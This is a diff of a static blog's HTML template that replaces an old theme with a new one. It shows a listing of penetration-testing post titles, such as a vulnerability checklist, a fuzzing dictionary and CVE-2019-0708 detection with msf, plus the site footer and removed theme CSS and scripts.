-		  
-		      
-		  
-		      
-		  
-		      
-		  
-		      
-		  
-		      
-		  
-		      
-		  
-		      
-		  
-		      
-		  
-		      
-		   
-		  		</ul>
-                </div>
+                 
+            
+              <div class="post-read-more">
+                <a href="15597856399146.html">[Read More]</a>
               </div>
-        </div><!-- sidebar -->
-      </div><!-- hide for small -->
-</div><!-- large 4 -->
+            </li>
+            
+        
+            <li class="post-stub">
+              <h2 class="post-stub-title">
+                <a href="15596178265897.html">
+                  业务逻辑漏洞安全检查checklist
+                </a>
+              </h2>
+              <p>
+                <time class="post-stub-date" datetime="2019-09-26">Posted 2019/06/04</time>
+              </p>
 
-</div><!-- row -->
+                 
+            
+              <div class="post-read-more">
+                <a href="15596178265897.html">[Read More]</a>
+              </div>
+            </li>
+            
+        
+            <li class="post-stub">
+              <h2 class="post-stub-title">
+                <a href="15596171974228.html">
+                  最近做了个 fuzzing 字典精简版
+                </a>
+              </h2>
+              <p>
+                <time class="post-stub-date" datetime="2019-09-26">Posted 2019/06/04</time>
+              </p>
 
- <div class="page-bottom clearfix">
-  <div class="row">
-   <p class="copyright">Copyright &copy; 2015
-Powered by <a target="_blank" href="http://www.mweb.im">MWeb</a>,&nbsp; 
-Theme used <a target="_blank" href="http://github.com">GitHub CSS</a>.</p>
+                 
+            
+              <div class="post-read-more">
+                <a href="15596171974228.html">[Read More]</a>
+              </div>
+            </li>
+            
+        
+            <li class="post-stub">
+              <h2 class="post-stub-title">
+                <a href="15595455557551.html">
+                  使用 msf 检测 cve-2019-0708 WindowsRDP 远程代码执行漏洞
+                </a>
+              </h2>
+              <p>
+                <time class="post-stub-date" datetime="2019-09-26">Posted 2019/06/03</time>
+              </p>
+
+                 
+            
+              <div class="post-read-more">
+                <a href="15595455557551.html">[Read More]</a>
+              </div>
+            </li>
+            
+      </ol>
+  <div class="post-navigation">
+    <nav class="pagination">
+       
+       <a class="older-posts" href="渗透测试_1.html">Older Posts &rarr;</a> 
+    </nav>
   </div>
 </div>
+             
 
-        </section>
-      </div>
-    </div>
+
+    <footer class="footer">
+            <div class="container">
+                <div class="site-footer-wrapper">
+                        <a class="button-square" href="index.html">
+<svg class="svg-inline--fa fa-home fa-w-18" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="home" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" data-fa-i2svg=""><path fill="currentColor" d="M280.37 148.26L96 300.11V464a16 16 0 0 0 16 16l112.06-.29a16 16 0 0 0 15.92-16V368a16 16 0 0 1 16-16h64a16 16 0 0 1 16 16v95.64a16 16 0 0 0 16 16.05L464 480a16 16 0 0 0 16-16V300L295.67 148.26a12.19 12.19 0 0 0-15.3 0zM571.6 251.47L488 182.56V44.05a12 12 0 0 0-12-12h-56a12 12 0 0 0-12 12v72.61L318.47 43a48 48 0 0 0-61 0L4.34 251.47a12 12 0 0 0-1.6 16.9l25.5 31A12 12 0 0 0 45.15 301l235.22-193.74a12.19 12.19 0 0 1 15.3 0L530.9 301a12 12 0 0 0 16.9-1.6l25.5-31a12 12 0 0 0-1.7-16.93z"></path></svg>
+                            </a>
+                        
+                         
+                        
+                        
+                        
+                        <a class="button-square" href="https://github.com/AlShelley/lonelyorWiki" target="_blank" title="github">
+                               <svg class="svg-inline--fa fa-github fa-w-16" aria-hidden="true" focusable="false" data-prefix="fab" data-icon="github" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" data-fa-i2svg=""><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg><!-- <i class="fab fa-github fa-lg"></i> -->
+                          </a>
+                        
+                        
+                      
+                      <a class="button-square" href="atom.xml" target="_blank" title="RSS">
+                              <svg class="svg-inline--fa fa-rss fa-w-14" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="rss" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M128.081 415.959c0 35.369-28.672 64.041-64.041 64.041S0 451.328 0 415.959s28.672-64.041 64.041-64.041 64.04 28.673 64.04 64.041zm175.66 47.25c-8.354-154.6-132.185-278.587-286.95-286.95C7.656 175.765 0 183.105 0 192.253v48.069c0 8.415 6.49 15.472 14.887 16.018 111.832 7.284 201.473 96.702 208.772 208.772.547 8.397 7.604 14.887 16.018 14.887h48.069c9.149.001 16.489-7.655 15.995-16.79zm144.249.288C439.596 229.677 251.465 40.445 16.503 32.01 7.473 31.686 0 38.981 0 48.016v48.068c0 8.625 6.835 15.645 15.453 15.999 191.179 7.839 344.627 161.316 352.465 352.465.353 8.618 7.373 15.453 15.999 15.453h48.068c9.034-.001 16.329-7.474 16.005-16.504z"></path></svg><!-- <i class="fas fa-rss fa-lg"></i> -->
+                      </a>
+
+              
+                       
+                                                
+                </div>
+                <div class="site-menu-wrapper">
+                  &nbsp;<span>|</span>&nbsp;
+                  
+                    <a target="_self" class="" href="index.html">首页</a>
+                    &nbsp;<span>|</span>&nbsp;
+                  
+                    <a target="_blank" class="" href="archives.html">归档</a>
+                    &nbsp;<span>|</span>&nbsp;
+                  
+                    <a target="_blank" class="" href="ruby.html">流光</a>
+                    &nbsp;<span>|</span>&nbsp;
+                  
+                    <a target="_blank" class="" href="beautiful.html">惊鸿</a>
+                    &nbsp;<span>|</span>&nbsp;
+                  
+                    <a target="_blank" class="" href="lose.html">失乐园</a>
+                    &nbsp;<span>|</span>&nbsp;
+                  
+                    <a target="_blank" class="" href="search.html">北斗</a>
+                    &nbsp;<span>|</span>&nbsp;
+                  
+                    <a target="_blank" class="" href="about.html">关于</a>
+                    &nbsp;<span>|</span>&nbsp;
+                                             
+                </div>
+
+                <p class="footer-copyright">
+                        Copyright &copy; 2019
+                        Powered by <a target="_blank" href="http://www.mweb.im">MWeb</a>,&nbsp; 
+                        Theme used <a target="_blank" href="https://blog.timac.org">Timac</a>.
+                </p>
+            </div>
+        </footer>
 
 
 
@@ -794,218 +261,11 @@ Theme used <a target="_blank" href="http://github.com">GitHub CSS</a>.</p>
 
 
 
-
-<style type="text/css">
-figure{margin: 0;padding: 0;}
-figcaption{text-align:center;}
-
-/* PrismJS 1.14.0
- http://prismjs.com/download.html#themes=prism&languages=markup+css+clike+javascript */
-/**
- * prism.js default theme for JavaScript, CSS and HTML
- * Based on dabblet (http://dabblet.com)
- * @author Lea Verou
- */
-
-code[class*="language-"],
-pre[class*="language-"] {
-    color: black;
-    background: none;
-    text-shadow: 0 1px white;
-    font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
-    text-align: left;
-    white-space: pre;
-    word-spacing: normal;
-    word-break: normal;
-    word-wrap: normal;
-    line-height: 1.5;
-    
-    -moz-tab-size: 4;
-    -o-tab-size: 4;
-    tab-size: 4;
-    
-    -webkit-hyphens: none;
-    -moz-hyphens: none;
-    -ms-hyphens: none;
-    hyphens: none;
-}
-
-pre[class*="language-"]::-moz-selection, pre[class*="language-"] ::-moz-selection,
-code[class*="language-"]::-moz-selection, code[class*="language-"] ::-moz-selection {
-    text-shadow: none;
-    background:#b3d4fc;
-}
-
-pre[class*="language-"]::selection, pre[class*="language-"] ::selection,
-code[class*="language-"]::selection, code[class*="language-"] ::selection {
-    text-shadow: none;
-    background: #b3d4fc;
-}
-
-@media print {
-    code[class*="language-"],
-    pre[class*="language-"] {
-        text-shadow: none;
-    }
-}
-
-/* Code blocks */
-pre[class*="language-"] {
-    padding: 1em;
-    margin: .5em 0;
-    overflow: auto;
-}
-
-:not(pre) > code[class*="language-"],
-pre[class*="language-"] {
-    background: #F7F7F7;
-}
-
-/* Inline code */
-:not(pre) > code[class*="language-"] {
-    padding: .1em;
-    border-radius: .3em;
-    white-space: normal;
-}
-
-.token.comment,
-.token.prolog,
-.token.doctype,
-.token.cdata {
-    color: slategray;
-}
-
-.token.punctuation {
-    color: #999;
-}
-
-.namespace {
-    opacity: .7;
-}
-
-.token.property,
-.token.tag,
-.token.boolean,
-.token.number,
-.token.constant,
-.token.symbol,
-.token.deleted {
-    color: #905;
-}
-
-.token.selector,
-.token.attr-name,
-.token.string,
-.token.char,
-.token.builtin,
-.token.inserted {
-    color: #690;
-}
-
-.token.operator,
-.token.entity,
-.token.url,
-.language-css .token.string,
-.style .token.string {
-    color: #9a6e3a;
-    background: hsla(0, 0%, 100%, .5);
-}
-
-.token.atrule,
-.token.attr-value,
-.token.keyword {
-    color: #07a;
-}
-
-.token.function,
-.token.class-name {
-    color: #DD4A68;
-}
-
-.token.regex,
-.token.important,
-.token.variable {
-    color: #e90;
-}
-
-.token.important,
-.token.bold {
-    font-weight: bold;
-}
-.token.italic {
-    font-style: italic;
-}
-
-.token.entity {
-    cursor: help;
-}
-
-
-pre[class*="language-"].line-numbers {
-    position: relative;
-    padding-left: 3.8em;
-    counter-reset: linenumber;
-}
-
-pre[class*="language-"].line-numbers > code {
-    position: relative;
-    white-space: inherit;
-}
-
-.line-numbers .line-numbers-rows {
-    position: absolute;
-    pointer-events: none;
-    top: 0;
-    font-size: 100%;
-    left: -3.8em;
-    width: 3em; /* works for line-numbers below 1000 lines */
-    letter-spacing: -1px;
-    border-right: 1px solid #999;
-
-    -webkit-user-select: none;
-    -moz-user-select: none;
-    -ms-user-select: none;
-    user-select: none;
-
-}
-
-    .line-numbers-rows > span {
-        pointer-events: none;
-        display: block;
-        counter-increment: linenumber;
-    }
-
-        .line-numbers-rows > span:before {
-            content: counter(linenumber);
-            color: #999;
-            display: block;
-            padding-right: 0.8em;
-            text-align: right;
-        }
-
-</style>
-
+        
+      
   
     
 
-    <script src="asset/js/foundation.min.js"></script>
-    <script>
-      $(document).foundation();
-      function fixSidebarHeight(){
-        var w1 = $('.markdown-body').height();
-          var w2 = $('#sidebar').height();
-          if (w1 > w2) { $('#sidebar').height(w1); };
-      }
-      $(function(){
-        fixSidebarHeight();
-      })
-      $(window).load(function(){
-          fixSidebarHeight();
-      });
-     
-    </script>
 
-
-
-  </body>
+    </body>
 </html>
